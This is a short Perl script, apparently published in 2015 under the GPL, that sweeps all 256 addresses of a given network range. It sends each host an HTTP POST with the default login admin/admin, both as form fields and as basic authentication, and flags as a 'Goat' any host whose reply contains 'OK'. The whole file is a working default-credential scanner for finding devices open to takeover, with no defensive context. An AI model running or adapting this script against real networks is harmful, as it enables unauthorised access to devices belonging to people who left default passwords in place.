#! /usr/bin/perl

# ------------------------------------------
# Script written by Anil Jagtap (c) 2015
# Email: anil.softx@gmail.com
# Published under GNU GPL
# V 0.1 (Stable)
# ------------------------------------------

use HTTP::Request::Common qw(POST);
use LWP::UserAgent;

my $ua = LWP::UserAgent->new;
$ua->timeout(5); #Wait maximum 5 seconds to get the result

$range = $ARGV[0];
$bit = 0;

while ( $bit <= 255 ){
 $host = "$range.$bit";
 testRT($host);
 $bit++;
}

sub testRT{
  my $host = shift; 
  print "Checking $host ...\n";

  my $req = POST "http://$host",
               Content_Type => form-data,
               Content => [
                           username=>'admin',
			   password=>'admin'
                          ];
  $req->authorization_basic('admin', 'admin');

  my $content = $ua->request($req)->as_string;

  if ( $content =~ /OK/ ){
    print "\t\tGoat $host\n";
  }
}

